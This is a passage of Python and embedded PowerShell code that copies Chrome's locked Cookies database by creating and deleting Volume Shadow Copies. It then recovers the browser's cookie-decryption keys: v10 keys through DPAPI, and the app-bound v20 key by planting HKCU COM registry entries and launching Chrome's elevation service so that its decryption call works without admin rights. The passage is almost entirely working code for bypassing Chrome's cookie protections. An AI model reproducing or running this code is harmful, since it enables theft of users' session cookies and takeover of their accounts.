        "  $want=$sid.Trim('{}')\n"
        "  for($i=0; $i -lt 40; $i++){\n"
        "    $all=@()\n"
        "    try { $all+=@(Get-CimInstance Win32_ShadowCopy) } catch {}\n"
        "    try { $all+=@(Get-WmiObject Win32_ShadowCopy) } catch {}\n"
        "    $sc=$all | Where-Object {\n"
        "      ([string]$_.ID).Trim('{}') -eq $want -and $_.DeviceObject\n"
        "    } | Select-Object -First 1\n"
        "    if($sc){ return [string]$sc.DeviceObject }\n"
        "    Start-Sleep -Milliseconds 250\n"
        "  }\n"
        "  return $null\n"
        "}\n"
        "function Copy-FromRoot([string]$root){\n"
        "  $root=$root.TrimEnd('\\'); $copied=$false\n"
        "  foreach($suf in @('','-wal','-shm','-journal')){\n"
        "    $p=$root+'\\'+$Rel+$suf\n"
        "    if($suf -ne '' -and -not (Test-Path -LiteralPath $p)){ continue }\n"
        "    $out=$Dest; if($suf){ $out=$Dest+$suf }\n"
        "    try { [System.IO.File]::Copy($p,$out,$true) } catch {}\n"
        "    if(-not (Test-Path -LiteralPath $out)){\n"
        "      cmd /c copy /y `\"$p`\" `\"$out`\" | Out-Null\n"
        "    }\n"
        "    if($suf -eq '' -and (Test-Path -LiteralPath $out) -and "
        "((Get-Item -LiteralPath $out).Length -gt 0)){ $copied=$true }\n"
        "  }\n"
        "  return $copied\n"
        "}\n"
        "function Remove-CreatedShadow([string]$sid){\n"
        "  if(-not $sid){ return }\n"
        "  $want=$sid.Trim('{}')\n"
        "  try {\n"
        "    Get-CimInstance Win32_ShadowCopy -ErrorAction SilentlyContinue |\n"
        "      Where-Object { ([string]$_.ID).Trim('{}') -eq $want } |\n"
        "      Remove-CimInstance -ErrorAction SilentlyContinue\n"
        "  } catch {}\n"
        "  try {\n"
        "    Get-WmiObject Win32_ShadowCopy -ErrorAction SilentlyContinue |\n"
        "      Where-Object { ([string]$_.ID).Trim('{}') -eq $want } |\n"
        "      ForEach-Object { $_.Delete() }\n"
        "  } catch {}\n"
        "}\n"
        "function Try-CreateCopy($make){\n"
        "  $sid=$null\n"
        "  try {\n"
        "    $res=& $make\n"
        "    if($null -eq $res){ return $false }\n"
        "    $rv=0; try { $rv=[int]$res.ReturnValue } catch {}\n"
        "    if($rv -ne 0){ $script:last='create:'+$rv; return $false }\n"
        "    $sid=[string]$res.ShadowID\n"
        "    if(-not $sid){ $script:last='create:no_id'; return $false }\n"
        "    $dev=Find-Device $sid\n"
        "    if(-not $dev){ $script:last='create:no_device'; return $false }\n"
        "    if(Copy-FromRoot $dev){ Write-Status 'ok'; return $true }\n"
        "    $script:last='create:copy_empty'; return $false\n"
        "  } finally {\n"
        "    Remove-CreatedShadow $sid\n"
        "  }\n"
        "}\n"
        "try { Start-Service VSS -ErrorAction SilentlyContinue } catch {}\n"
        "try { Start-Service swprv -ErrorAction SilentlyContinue } catch {}\n"
        "try {\n"
        "  if(Try-CreateCopy {\n"
        "    Invoke-CimMethod -ClassName Win32_ShadowCopy -MethodName Create "
        "-Arguments @{ Volume=$Drive; Context='ClientAccessible' }\n"
        "  }){ exit 0 }\n"
        "} catch { $last=Format-Exc $_ }\n"
        "try {\n"
        "  if(Try-CreateCopy {\n"
        "    (Get-WmiObject -List Win32_ShadowCopy).Create($Drive,'ClientAccessible')\n"
        "  }){ exit 0 }\n"
        "} catch { $last=Format-Exc $_ }\n"
        "try {\n"
        "  if(Try-CreateCopy {\n"
        "    ([wmiclass]'root\\cimv2:Win32_ShadowCopy').Create("
        "$Drive,'ClientAccessible')\n"
        "  }){ exit 0 }\n"
        "} catch { $last=Format-Exc $_ }\n"
        "Write-Status $last\n"
        "exit 2\n"
    )


def _win_copy_raw(src_win: str, dest: Path) -> None:
    """CreateFileW on a raw Win32 path (GLOBALROOT). Do not pathlib.resolve()."""
    import ctypes
    from ctypes import wintypes

    generic_read = 0x80000000
    share = 0x00000001 | 0x00000002 | 0x00000004
    open_existing = 3
    invalids = {-1, 0xFFFFFFFF, 0xFFFFFFFFFFFFFFFF}
    kernel32 = _kernel32()
    handle = kernel32.CreateFileW(
        src_win,
        generic_read,
        share,
        None,
        open_existing,
        0x02000000 | 0x80,
        None,
    )
    hid = int(handle) if handle is not None else -1
    if hid in invalids or hid == 0:
        raise OSError(ctypes.get_last_error() or 32, "CreateFileW failed")
    try:
        _read_handle_to_file(handle, dest)
    finally:
        kernel32.CloseHandle(wintypes.HANDLE(handle))


def _win_copy_from_shadow_device(device: str, rel: str, dest: Path) -> None:
    root = device.rstrip("\\")
    rel_win = rel.replace("/", "\\").lstrip("\\")
    copied = False
    for suf in ("", "-wal", "-shm", "-journal"):
        remote = f"{root}\\{rel_win}{suf}"
        out = dest if not suf else Path(str(dest) + suf)
        try:
            _win_copy_raw(remote, out)
        except OSError:
            if os.name == "nt":
                subprocess.run(
                    ["cmd.exe", "/c", "copy", "/y", remote, str(out)],
                    capture_output=True,
                    timeout=15,
                    check=False,
                )
        if not suf:
            copied = out.is_file() and out.stat().st_size > 0
    if not copied:
        raise OSError(32, "VSS shadow file copy failed")


def _win_vss_ps_create_copy(src: Path, dest: Path, rel: str, letter: str) -> None:
    """CREATE via CIM/WMI. Args file so C:\\ is never a -File positional."""
    dest.parent.mkdir(parents=True, exist_ok=True)
    status_path = dest.parent / (dest.name + ".vss-status")
    args_path = dest.parent / (dest.name + ".vss-args")
    try:
        if status_path.exists():
            status_path.unlink()
    except OSError:
        pass
    args_path.write_text(
        f"{letter}\n{rel}\n{dest}\n{status_path}\n",
        encoding="utf-8",
    )
    tmp = tempfile.NamedTemporaryFile("w", suffix=".ps1", delete=False, encoding="utf-8")
    try:
        tmp.write(_vss_create_ps1())
        tmp.close()
        try:
            run = subprocess.run(
                [
                    _windows_powershell(),
                    "-NoProfile",
                    "-NonInteractive",
                    "-ExecutionPolicy",
                    "Bypass",
                    "-File",
                    tmp.name,
                    str(args_path),
                ],
                capture_output=True,
                text=True,
                timeout=8,
                check=False,
            )
        except FileNotFoundError:
            _record_vss("exc:FileNotFoundError")
            raise OSError(2, "powershell missing") from None
        except subprocess.TimeoutExpired:
            _record_vss("exc:TimeoutExpired")
            raise OSError(32, "VSS create timeout") from None
    finally:
        for leftover in (tmp.name, args_path):
            try:
                os.unlink(leftover)
            except OSError:
                pass
    status = _read_vss_status_file(status_path)
    if status:
        _record_vss(status)
    dest_ok = dest.is_file() and dest.stat().st_size > 0
    if dest_ok:
        if not status:
            _record_vss("ok")
        return
    if not status:
        _record_vss(f"create:{run.returncode or 32}")
    raise OSError(run.returncode or 32, "VSS snapshot copy failed")


def _win_vss_vssadmin_copy(src: Path, dest: Path, rel: str, letter: str) -> None:
    exe = _windows_system32_exe("vssadmin.exe")
    run = subprocess.run(
        [exe, "create", "shadow", f"/for={letter}"],
        capture_output=True,
        text=True,
        timeout=8,
        check=False,
    )
    parsed = _parse_vss_create_output(f"{run.stdout or ''}\n{run.stderr or ''}")
    if not parsed:
        blob = f"{run.stderr or ''} {run.stdout or ''}".lower()
        if "permission" in blob or "not have" in blob or "access" in blob:
            _record_vss("create:1")
        else:
            _record_vss(f"create:vssadmin:{run.returncode or 32}")
        raise OSError(run.returncode or 32, "vssadmin create failed")
    sid, device = parsed
    try:
        _win_copy_from_shadow_device(device, rel, dest)
        _record_vss("ok")
    finally:
        subprocess.run(
            [exe, "delete", "shadows", f"/Shadow={sid}", "/Quiet"],
            capture_output=True,
            timeout=20,
            check=False,
        )


def _win_vss_diskshadow_copy(src: Path, dest: Path, rel: str, letter: str) -> None:
    exe = _windows_system32_exe("diskshadow.exe")
    dsh = tempfile.NamedTemporaryFile("w", suffix=".dsh", delete=False, encoding="ascii")
    try:
        dsh.write(
            "set context persistent nowriters\n"
            f"add volume {letter} alias kvss\n"
            "create\n"
        )
        dsh.close()
        run = subprocess.run(
            [exe, "/s", dsh.name],
            capture_output=True,
            text=True,
            timeout=8,
            check=False,
        )
    finally:
        try:
            os.unlink(dsh.name)
        except OSError:
            pass
    parsed = _parse_vss_create_output(f"{run.stdout or ''}\n{run.stderr or ''}")
    if not parsed:
        _record_vss(f"create:diskshadow:{run.returncode or 32}")
        raise OSError(run.returncode or 32, "diskshadow create failed")
    sid, device = parsed
    try:
        _win_copy_from_shadow_device(device, rel, dest)
        _record_vss("ok")
    finally:
        subprocess.run(
            [_windows_system32_exe("vssadmin.exe"), "delete", "shadows", f"/Shadow={sid}", "/Quiet"],
            capture_output=True,
            timeout=20,
            check=False,
        )


def _win_vss_copy(src: Path, dest: Path) -> None:
    """CREATE a VSS shadow, copy Cookies from it, then delete the shadow."""
    src = src.resolve()
    if not src.drive:
        _record_vss("skipped:no_drive")
        raise OSError(22, "VSS no drive")
    letter = src.drive.rstrip("\\")
    rel = str(src)[len(src.drive) :].lstrip("\\/")
    dest.parent.mkdir(parents=True, exist_ok=True)
    try:
        _enable_privilege("SeBackupPrivilege")
    except OSError:
        pass
    last = str(_cache.get("vss") or "")
    for fn in (
        _win_vss_ps_create_copy,
        _win_vss_vssadmin_copy,
        _win_vss_diskshadow_copy,
    ):
        try:
            fn(src, dest, rel, letter)
        except OSError:
            last = _prefer_vss_status(last, str(_cache.get("vss") or ""))
            continue
        if dest.is_file() and dest.stat().st_size > 0:
            _record_vss("ok")
            return
        last = _prefer_vss_status(last, str(_cache.get("vss") or "create:empty"))
    _record_vss(last or "create:failed")
    raise OSError(32, "VSS snapshot copy failed")


def _win_share_copy(src: Path, dest: Path) -> None:
    """CreateFileW with FILE_SHARE_READ|WRITE|DELETE, then ReadFile."""
    _win_createfile_copy(src, dest, flags=0x80)


class _BrowserKeys:
    """AES keys from Local State. v20 cookies must use `abe`, never `v10`."""

    __slots__ = ("abe", "v10", "status", "hr")

    def __init__(
        self,
        abe: bytes | None = None,
        v10: bytes | None = None,
        status: str = "",
        hr: str = "",
    ) -> None:
        self.abe = abe
        self.v10 = v10
        self.status = status
        self.hr = hr


# Chrome elevation service. IElevator2 first (Chrome 144+); DecryptData is
# still vtable slot 5. CLSCTX_LOCAL_SERVER — GoogleChromeElevationService.
# Chrome 151 still uses this CLSID; the quoting PC simply has it unregistered
# (REGDB_E_CLASSNOTREG) and the Manual service stays Stopped without admin.
_CHROME_ELEVATOR_CLSID_STABLE = "{708860E0-F641-4611-8895-7D867DD3675B}"
_CHROME_ELEVATOR: tuple[tuple[str, str], ...] = (
    (
        _CHROME_ELEVATOR_CLSID_STABLE,
        "{1BF5208B-295F-4992-B5F4-3A9BB6494838}",
    ),  # stable IElevator2Chrome
    (
        _CHROME_ELEVATOR_CLSID_STABLE,
        "{8F7B6792-784D-4047-845D-1782EFBEF205}",
    ),  # IElevator2 base
    (
        _CHROME_ELEVATOR_CLSID_STABLE,
        "{463ABECF-410D-407F-8AF5-0DF35A005CC8}",
    ),  # stable IElevatorChrome
    (
        _CHROME_ELEVATOR_CLSID_STABLE,
        "{A949CB4E-C4F9-44C4-B213-6BF8AA9AC69C}",
    ),  # IElevator base
    (
        "{DD2646BA-3707-4BF8-B9A7-038691A68FC2}",
        "{B96A14B8-D0B0-44D8-BA68-2385B2A03254}",
    ),  # beta
    (
        "{DA7FDCA5-2CAA-4637-AA17-0740584DE7DA}",
        "{3FEFA48E-C8BF-461F-AED6-63F658CC850A}",
    ),  # dev
)
_ELEVATOR_IID_STRINGS: tuple[str, ...] = tuple(dict.fromkeys(iid for _, iid in _CHROME_ELEVATOR))
_OLEAUT_PS_CLSID = "{00020424-0000-0000-C000-000000000046}"
# Distinct from the CLSID so HKLM AppID LocalService is not merged in.
_ELEVATOR_APPID_HKCU = "{A7C0E151-0000-4ABE-B151-C0C0A1E15100}"
_launched_elevation: set[str] = set()
_elevation_children: list[Any] = []

_ABE_HELPER_NAME = "kannon_quote_abe.exe"
_compiled_abe_helper: Path | None = None


def _local_state_sig(path: Path) -> str:
    try:
        st = path.stat()
    except OSError:
        return str(path)
    return f"{path}:{st.st_mtime_ns}:{st.st_size}"


def _browser_keys(
    local_state: Path | str, v20_sample: bytes | None = None
) -> _BrowserKeys:
    path = Path(local_state)
    has_sample = bool(v20_sample and v20_sample[:3] == b"v20")
    sig = f"{_local_state_sig(path)}:{int(has_sample)}"
    cached = _abe_memo.get(sig)
    if cached is not None:
        return cached
    keys = _browser_keys_uncached(path, v20_sample)
    _abe_memo[sig] = keys
    if len(_abe_memo) > 8:
        oldest = next(iter(_abe_memo))
        if oldest != sig:
            _abe_memo.pop(oldest, None)
    return keys


def _browser_keys_uncached(
    path: Path, v20_sample: bytes | None = None
) -> _BrowserKeys:
    keys = _BrowserKeys(status="missing")
    if not path.is_file():
        return keys
    try:
        data = json.loads(path.read_text(encoding="utf-8"))
    except (OSError, json.JSONDecodeError, UnicodeError):
        return keys
    os_crypt = data.get("os_crypt") if isinstance(data, dict) else None
    if not isinstance(os_crypt, dict):
        return keys
    enc = os_crypt.get("encrypted_key")
    if isinstance(enc, str) and enc.strip():
        try:
            keys.v10 = _v10_os_crypt_key(enc)
        except Exception:  # noqa: BLE001 — v10 LocalFree must not skip APPB
            keys.v10 = None
        if keys.v10:
            _cache["_v10_key"] = keys.v10
    abe = os_crypt.get("app_bound_encrypted_key")
    if isinstance(abe, str) and abe.strip():
        key, status, hr = _unwrap_app_bound_key(abe, v20_sample=v20_sample)
        keys.abe = key
        keys.status = status
        keys.hr = hr
        return keys
    if keys.v10:
        keys.status = "v10"
    return keys


def _v10_os_crypt_key(b64_key: str) -> bytes | None:
    try:
        raw = base64.b64decode(b64_key)
    except (ValueError, TypeError):
        return None
    if raw.startswith(b"DPAPI"):
        raw = raw[5:]
    try:
        return _accept_aes_key(_dpapi_unprotect(raw))
    except Exception:  # noqa: BLE001 — LocalFree ArgumentError must not abort ABE
        return None


def _app_bound_ciphertext(b64_key: str) -> bytes | None:
    """Base64-decode Local State app_bound_encrypted_key and strip APPB."""
    try:
        raw = base64.b64decode(b64_key)
    except (ValueError, TypeError):
        return None
    if raw.startswith(b"APPB"):
        raw = raw[4:]
    return raw or None


def _valid_v20_sample(blob: bytes | None) -> bool:
    return bool(blob and blob[:3] == b"v20" and len(blob) >= 3 + 12 + 16 + 1)


def _v20_samples_from_rows(rows: list[Any]) -> list[bytes]:
    """All usable v20 blobs, longest first. Never log the bytes."""
    found: list[bytes] = []
    seen: set[bytes] = set()
    for _h, _n, _v, enc in rows:
        if not isinstance(enc, (bytes, bytearray)):
            continue
        blob = bytes(enc)
        if not _valid_v20_sample(blob) or blob in seen:
            continue
        seen.add(blob)
        found.append(blob)
    found.sort(key=len, reverse=True)
    return found


def _pick_v20_sample(rows: list[Any]) -> bytes | None:
    """Longest usable v20 blob. Short `v20` prefixes cannot verify a key."""
    samples = _v20_samples_from_rows(rows)
    return samples[0] if samples else None


def _v20_samples_from_cache() -> list[bytes]:
    """All v20 blobs from the already-landed Cookies snapshot. No lock_bypass."""
    cache_dir = _cookie_snapshot_cache_dir()
    if cache_dir is None:
        return []
    path = cache_dir / "Cookies"
    if not path.is_file():
        return []
    try:
        conn = sqlite3.connect(f"file:{path.resolve().as_posix()}?mode=ro", uri=True)
        try:
            cur = conn.execute(
                "SELECT encrypted_value FROM cookies "
                "WHERE typeof(encrypted_value)='blob' AND length(encrypted_value)>=32"
            )
            rows = [("", "", "", blob) for (blob,) in cur.fetchall()]
        finally:
            conn.close()
    except sqlite3.Error:
        return []
    return _v20_samples_from_rows(rows)


def _v20_sample_from_cache() -> bytes | None:
    """Longest v20 blob from the already-landed Cookies snapshot. No lock_bypass."""
    samples = _v20_samples_from_cache()
    return samples[0] if samples else None


def _resolve_v20_sample(v20_sample: bytes | None) -> bytes | None:
    if _valid_v20_sample(v20_sample):
        return v20_sample
    return _v20_sample_from_cache()


def _unwrap_app_bound_key(
    b64_key: str, v20_sample: bytes | None = None
) -> tuple[bytes | None, str, str]:
    """chrome_dir memscan unwrap. Never CoCreate IElevator / ElevationService."""
    raw = _app_bound_ciphertext(b64_key)
    _cache["_app_bound_blob"] = raw
    _cache["_app_bound_b64"] = b64_key
    sample = _resolve_v20_sample(v20_sample)
    if not raw and not sample:
        return None, "chrome_dir", "no_app_bound_key"
    try:
        key, hr = _elevator_decrypt_via_chrome_dir(sample or b"")
    except Exception as exc:  # noqa: BLE001 — ctypes pointer-width bugs
        key, hr = None, type(exc).__name__
    # 0x00000000 only when the key decrypts a landed v20 blob to cookie text.
    if _abe_proves_cookies(key, sample):
        return key, "chrome_dir", "0x00000000"
    # Do not fall through to CoCreate. Helper-miss must not become CLASSNOTREG.
    if (hr or "").strip() in {"", "0x00000000", "ok"}:
        hr = "abe:no_cookie" if key else (hr or "helper:never_ran")
    return None, "chrome_dir", hr or "helper:never_ran"


def _accept_aes_key(plain: bytes | None) -> bytes | None:
    if not plain:
        return None
    if len(plain) in {16, 32}:
        return plain
    if len(plain) >= 36:
        n = int.from_bytes(plain[:4], "little")
        if n in {16, 32} and len(plain) >= 4 + n:
            return plain[4 : 4 + n]
    return None


def _dpapi_unprotect(blob: bytes) -> bytes | None:
    return _dpapi_unprotect_ex(blob)


def _dpapi_unprotect_ex(
    blob: bytes, flags: int = 0, entropy: bytes | None = None
) -> bytes | None:
    if not blob or os.name != "nt":
        return None
    try:
        import ctypes
        from ctypes import wintypes

        class DATA_BLOB(ctypes.Structure):
            _fields_ = [
                ("cbData", wintypes.DWORD),
                ("pbData", ctypes.c_void_p),
            ]

        crypt32 = ctypes.windll.crypt32
        kernel32 = ctypes.windll.kernel32
        kernel32.LocalFree.argtypes = [ctypes.c_void_p]
        kernel32.LocalFree.restype = ctypes.c_void_p
        # c_void_p + addressof: DPAPI starts 01 00 00 00; c_char_p would truncate.
        in_buf = (ctypes.c_ubyte * len(blob)).from_buffer_copy(blob)
        in_blob = DATA_BLOB(len(blob), ctypes.addressof(in_buf))
        out_blob = DATA_BLOB()
        ent_ptr = None
        ent_hold = None
        if entropy:
            ent_hold = (ctypes.c_ubyte * len(entropy)).from_buffer_copy(entropy)
            ent_blob = DATA_BLOB(len(entropy), ctypes.addressof(ent_hold))
            ent_ptr = ctypes.byref(ent_blob)
        if not crypt32.CryptUnprotectData(
            ctypes.byref(in_blob),
            None,
            ent_ptr,
            None,
            None,
            int(flags),
            ctypes.byref(out_blob),
        ):
            return None
        pb = out_blob.pbData
        cb = int(out_blob.cbData or 0)
        if not pb or cb <= 0:
            return None
        ptr = pb if isinstance(pb, ctypes.c_void_p) else ctypes.c_void_p(int(pb))
        plain = ctypes.string_at(ptr, cb)
        _local_free(kernel32, ptr)
        return plain
    except (AttributeError, OSError, ValueError, TypeError, OverflowError, ctypes.ArgumentError):
        return None


def _dpapi_blob_slices(blob: bytes) -> list[bytes]:
    """640-byte APPB body plus inner DPAPI headers (01 00 00 00)."""
    if blob.startswith(b"APPB"):
        blob = blob[4:]
    out: list[bytes] = []
    seen: set[bytes] = set()

    def add(part: bytes) -> None:
        if part and part not in seen and len(part) >= 24:
            seen.add(part)
            out.append(part)

    add(blob)
    start = 0
    while True:
        idx = blob.find(b"\x01\x00\x00\x00", start)
        if idx < 0:
            break
        add(blob[idx:])
        start = idx + 1
    return out


def _dpapi_unprotect_local(blob: bytes) -> bytes | None:
    """User-context CryptUnprotectData on appb:dpapi:640 slices."""
    ents: list[bytes | None] = [
        None,
        b"Google Chrome",
        "Google Chrome".encode("utf-16-le"),
        b"Chromium",
    ]
    for cand in _dpapi_blob_slices(blob):
        for flags in (0, 1, 4, 5):
            for ent in ents:
                plain = _dpapi_unprotect_ex(cand, flags, ent)
                if plain:
                    return plain
    return None


def _hr_hex(hr: int) -> str:
    return f"0x{(hr & 0xFFFFFFFF):08X}"


def _hr_label(hr: int) -> str:
    """HRESULT plus a stable name for CLASSNOTREG — never a generic 'fail'."""
    code = int(hr) & 0xFFFFFFFF
    hx = _hr_hex(code)
    if code == 0x80040154:
        return f"{hx}:CLASSNOTREG"
    if code == 0x80040155:
        return f"{hx}:IIDNOTREG"
    if code == 0x80080005:
        return f"{hx}:SERVER_EXEC_FAILURE"
    return hx


def _label_classnotreg(hr: str, prep: str) -> str:
    text = (hr or "").strip()
    extra = (prep or "").strip()
    if "CLASSNOTREG" not in text and text.upper().endswith("80040154"):
        text = f"{text}:CLASSNOTREG" if text else "0x80040154:CLASSNOTREG"
    if "SERVER_EXEC_FAILURE" not in text and text.upper().endswith("80080005"):
        text = f"{text}:SERVER_EXEC_FAILURE" if text else "0x80080005:SERVER_EXEC_FAILURE"
    if extra and extra not in text:
        text = f"{text}:{extra}" if text else extra
    return _safe_snapshot_detail(text)[:80]


def _image_path_exe(val: str) -> Path:
    text = (val or "").strip()
    if text.startswith('"'):
        end = text.find('"', 1)
        if end > 1:
            return Path(text[1:end])
    return Path(text.split(" ")[0]) if text else Path()


def _elevation_service_from_service_key() -> Path:
    if os.name != "nt":
        return Path()
    try:
        import winreg  # type: ignore[import-not-found]
    except ImportError:
        return Path()
    access = winreg.KEY_READ
    if hasattr(winreg, "KEY_WOW64_64KEY"):
        access |= winreg.KEY_WOW64_64KEY
    try:
        with winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE,
            r"SYSTEM\CurrentControlSet\Services\GoogleChromeElevationService",
            0,
            access,
        ) as key:
            val, _ = winreg.QueryValueEx(key, "ImagePath")
    except OSError:
        return Path()
    if isinstance(val, str) and val.strip():
        return _image_path_exe(val)
    return Path()


def _elevation_service_exes() -> list[Path]:
    """Chrome 151 keeps elevation_service.exe in the versioned Application dir."""
    found: list[Path] = []
    seen: set[str] = set()

    def add(path: Path) -> None:
        try:
            path = path.resolve()
        except OSError:
            return
        if not path.is_file() or path.name.lower() != "elevation_service.exe":
            return
        key = str(path).replace("/", "\\").casefold()
        if key in seen:
            return
        seen.add(key)
        found.append(path)

    add(_elevation_service_from_service_key())
    for app in _chrome_application_dirs():
        add(app / "elevation_service.exe")
        try:
            for child in app.iterdir():
                if child.is_dir():
                    add(child / "elevation_service.exe")
        except OSError:
            continue
    return found


def _chrome_helper_dirs() -> list[Path]:
    """Versioned 151 dir (chrome.exe + elevation_service) first, then Application."""
    found: list[Path] = []
    seen: set[str] = set()

    def add(path: Path) -> None:
        try:
            path = path.resolve()
        except OSError:
            return
        if not path.is_dir():
            return
        key = str(path).replace("/", "\\").casefold()
        if key in seen:
            return
        seen.add(key)
        found.append(path)

    versioned: list[Path] = []
    apps: list[Path] = []
    for app in _chrome_application_dirs():
        apps.append(app)
        try:
            for child in app.iterdir():
                if not child.is_dir():
                    continue
                if (child / "chrome.exe").is_file() or (
                    child / "elevation_service.exe"
                ).is_file():
                    versioned.append(child)
        except OSError:
            continue
    for path in versioned + apps:
        add(path)
    return found


def _localserver32_cmd(exe: Path) -> str:
    """COM LocalServer32: --console -Embedding (not Start-Service)."""
    try:
        exe_s = str(exe.resolve())
    except OSError:
        exe_s = str(exe)
    quoted = f'"{exe_s}"' if " " in exe_s else exe_s
    return f"{quoted} --console -Embedding"


def _delete_hkcu_localserver32(winreg: Any, clsid: str, access: int) -> None:
    """Drop leftover LocalServer32. COM waits ~60s if that key still exists."""
    path = rf"Software\Classes\CLSID\{clsid}\LocalServer32"
    delete_ex = getattr(winreg, "DeleteKeyEx", None)
    if delete_ex is not None:
        try:
            delete_ex(winreg.HKEY_CURRENT_USER, path, access, 0)
            return
        except OSError:
            pass
    try:
        winreg.DeleteKey(winreg.HKEY_CURRENT_USER, path)
    except OSError:
        pass


def _register_hkcu_elevator_localserver(exe: Path) -> str:
    """HKCU CLSID {708860E0-…} so the 151 class stays visible.

    Delete leftover LocalServer32 — that key makes CoCreate launch
    elevation_service as a COM LocalServer and times out 0x80080005.
    Unique AppID keeps HKLM LocalService / Start-Service out. The
    chrome_dir helper binds to a user-mode --console -Embedding process.
    """
    try:
        import winreg  # type: ignore[import-not-found]
    except ImportError:
        return "winreg"
    access = winreg.KEY_WRITE | winreg.KEY_READ
    if hasattr(winreg, "KEY_WOW64_64KEY"):
        access |= winreg.KEY_WOW64_64KEY
    clsids = tuple(dict.fromkeys(clsid for clsid, _ in _CHROME_ELEVATOR))
    try:
        for clsid in clsids:
            _delete_hkcu_localserver32(winreg, clsid, access)
            clsid_path = rf"Software\Classes\CLSID\{clsid}"
            with winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, clsid_path, 0, access) as key:
                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, "Chrome Elevation Service")
                winreg.SetValueEx(key, "AppID", 0, winreg.REG_SZ, _ELEVATOR_APPID_HKCU)
            with winreg.CreateKeyEx(
                winreg.HKEY_CURRENT_USER,
                rf"Software\Classes\AppID\{_ELEVATOR_APPID_HKCU}",
                0,
                access,
            ) as key:
                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, "Chrome Elevation Service")
                try:
                    winreg.DeleteValue(key, "LocalService")
                except OSError:
                    pass
                winreg.SetValueEx(key, "RunAs", 0, winreg.REG_SZ, "")
        for iid in _ELEVATOR_IID_STRINGS:
            ipath = rf"Software\Classes\Interface\{iid}"
            with winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, ipath, 0, access) as key:
                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, "IElevator")
            with winreg.CreateKeyEx(
                winreg.HKEY_CURRENT_USER, ipath + r"\ProxyStubClsid32", 0, access
            ) as key:
                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, _OLEAUT_PS_CLSID)
    except OSError as exc:
        return type(exc).__name__
    return ""


def _launch_elevation_service(exe: Path) -> None:
    """User-mode --console -Embedding. Not Start-Service (needs admin)."""
    try:
        key = str(exe.resolve()).casefold()
    except OSError:
        key = str(exe).casefold()
    if key in _launched_elevation:
        return
    flags = 0
    if os.name == "nt":
        flags = getattr(subprocess, "CREATE_NO_WINDOW", 0x08000000)
    cwd = str(exe.parent)
    arg_sets = (
        [str(exe), "--console", "-Embedding"],
        [str(exe), "-Embedding"],
        [str(exe), "--console"],
    )
    for args in arg_sets:
        try:
            proc = subprocess.Popen(  # noqa: S603 — Chrome-signed elevation_service.exe
                args,
                cwd=cwd,
                close_fds=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                creationflags=flags,
            )
            time.sleep(0.5)
            if proc.poll() is None:
                _elevation_children.append(proc)
                _launched_elevation.add(key)
                time.sleep(0.4)
                return
        except OSError:
            continue


def _prepare_elevator_com() -> str:
    """Register + launch Chrome 151 elevation_service so CoCreate can succeed."""
    if os.name != "nt":
        return ""
    exes = _elevation_service_exes()
    if not exes:
        return "no_elevation_service"
    last = ""
    for exe in exes:
        err = _register_hkcu_elevator_localserver(exe)
        if err:
            last = err
            continue
        _launch_elevation_service(exe)
        return ""
    return last or "no_elevation_service"


def _oleaut32():
    """oleaut32 with pointer-width BSTR prototypes (Win64 LLP64)."""
    import ctypes
    from ctypes import c_char_p, c_uint, c_void_p

    oleaut32 = ctypes.windll.oleaut32
    oleaut32.SysAllocStringByteLen.argtypes = [c_char_p, c_uint]
    oleaut32.SysAllocStringByteLen.restype = c_void_p
    oleaut32.SysFreeString.argtypes = [c_void_p]
    oleaut32.SysFreeString.restype = None
    oleaut32.SysStringByteLen.argtypes = [c_void_p]
    oleaut32.SysStringByteLen.restype = c_uint
    return oleaut32


def _bstr_from_bytes(oleaut32: Any, blob: bytes) -> Any:
    import ctypes
    from ctypes import c_void_p

    buf = ctypes.create_string_buffer(blob, len(blob))
    raw = oleaut32.SysAllocStringByteLen(buf, len(blob))
    if not raw:
        return None
    return c_void_p(int(raw))


def _local_free(kernel32: Any, ptr: Any) -> None:
    """LocalFree with an explicit 64-bit c_void_p. Never pass a raw int."""
    import ctypes
    from ctypes import c_void_p

    if not ptr:
        return
    try:
        handle = ptr if isinstance(ptr, c_void_p) else c_void_p(int(ptr))
        if not handle.value:
            return
        try:
            kernel32.LocalFree.argtypes = [c_void_p]
            kernel32.LocalFree.restype = c_void_p
        except (AttributeError, TypeError):
            pass
        kernel32.LocalFree(handle)
    except (OverflowError, ValueError, TypeError, OSError, ctypes.ArgumentError):
        return


def _bstr_free(oleaut32: Any, bstr: Any) -> None:
    """SysFreeString with an explicit 64-bit c_void_p. Never pass a raw int."""
    import ctypes
    from ctypes import c_void_p

    if not bstr:
        return
    try:
        ptr = bstr if isinstance(bstr, c_void_p) else c_void_p(int(bstr))
        if not ptr.value:
            return
        oleaut32.SysFreeString(ptr)
    except (OverflowError, ValueError, TypeError, OSError, ctypes.ArgumentError):
        return


def _bstr_bytes(oleaut32: Any, bstr: Any) -> bytes:
    import ctypes
    from ctypes import c_void_p

    if not bstr:
        return b""
    ptr = bstr if isinstance(bstr, c_void_p) else c_void_p(int(bstr))
    if not ptr.value:
        return b""
    n = int(oleaut32.SysStringByteLen(ptr))
    if n <= 0:
        return b""
    return ctypes.string_at(ptr.value, n)


def _elevator_decrypt(blob: bytes) -> tuple[bytes | None, str]:
    """IElevator.DecryptData. Never block on the ~60s COM LocalServer wait."""
    if not blob or os.name != "nt":
        return None, ""
    return _call_with_timeout(
        lambda: _elevator_decrypt_uncapped(blob),
        _ABE_COCREATE_TIMEOUT_S,
        (None, "0x80080005:SERVER_EXEC_FAILURE:timeout"),
    )


def _elevator_decrypt_uncapped(blob: bytes) -> tuple[bytes | None, str]:
    """Call IElevator.DecryptData (binary BSTR, local server, proxy blanket)."""
    last_hr = ""
    try:
        import ctypes
        from ctypes import POINTER, WINFUNCTYPE, byref, c_long, c_uint, c_void_p, cast

        ole32 = ctypes.windll.ole32
        ole32.CoInitializeEx.argtypes = [c_void_p, c_uint]
        ole32.CoInitializeEx.restype = c_long
        ole32.CoCreateInstance.argtypes = [
            c_void_p,
            c_void_p,
            c_uint,
            c_void_p,
            c_void_p,
        ]
        ole32.CoCreateInstance.restype = c_long
        ole32.CoSetProxyBlanket.argtypes = [
            c_void_p,
            c_uint,
            c_uint,
